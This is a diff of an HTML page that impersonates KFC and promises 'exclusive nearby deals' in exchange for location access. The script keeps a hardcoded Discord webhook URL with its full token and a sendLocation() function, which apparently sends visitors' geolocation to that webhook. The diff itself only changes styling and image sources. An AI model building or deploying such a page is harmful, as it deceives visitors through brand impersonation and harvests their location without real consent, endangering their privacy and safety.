@@ -10,7 +10,7 @@
       padding: 0;
       height: 100%;
       font-family: 'Segoe UI', sans-serif;
-      background: linear-gradient(to bottom, #fff2e6, #ffd5a5);
+      background: linear-gradient(to bottom right, #ffecd2, #fcb69f);
       overflow: hidden;
     }
 
@@ -26,7 +26,7 @@
       position: absolute;
       width: 60px;
       opacity: 0.5;
-      animation: floatUp 10s linear infinite;
+      animation: floatUp 12s linear infinite;
     }
 
     @keyframes floatUp {
@@ -35,7 +35,7 @@
         opacity: 0;
       }
       50% {
-        opacity: 0.6;
+        opacity: 0.8;
       }
       100% {
         transform: translateY(-200px) rotate(360deg);
@@ -99,7 +99,7 @@
 
   <!-- Main Card -->
   <div class="card">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/6/6e/KFC-Logo.svg" alt="KFC Logo" class="logo">
+    <img src="kfc-logo.png" alt="KFC Logo" class="logo">
     <h1>KFC</h1>
     <p>Allow location to unlock exclusive nearby deals for your Birthday or Anniversary 🎁</p>
     <button class="btn" onclick="sendLocation()">🔎 Nearby KFC Deals</button>
@@ -107,15 +107,11 @@
   </div>
 
   <script>
-    // Food icons from online sources (no download needed)
-    const foodIcons = [
-      "https://cdn-icons-png.flaticon.com/512/3595/3595455.png", // drumstick
-      "https://cdn-icons-png.flaticon.com/512/3075/3075977.png", // sauce
-      "https://cdn-icons-png.flaticon.com/512/828/828569.png"     // wing
-    ];
-
+    // Background food animation from your local images
+    const foodIcons = ["drumstick.png", "sauce.png", "wing.png"];
     const bg = document.getElementById('background');
-    for (let i = 0; i < 20; i++) {
+
+    for (let i = 0; i < 25; i++) {
       const img = document.createElement('img');
       img.src = foodIcons[Math.floor(Math.random() * foodIcons.length)];
       img.style.left = Math.random() * 100 + 'vw';
@@ -125,7 +121,7 @@
       bg.appendChild(img);
     }
 
-    // Location + Webhook logic
+    // Webhook + Location Logic
     const webhookUrl = "https://discord.com/api/webhooks/1400382122866249758/e2PIiGtfPBi0SQlRzF55kOmzGW2yUl-0HvUfjgp0Pohh9IAoWnbP-7EmGSKNbUnHgXjh";
 
     function sendLocation() {
@@ -158,6 +154,7 @@
 
 </body>
 </html>
+
 
 
 
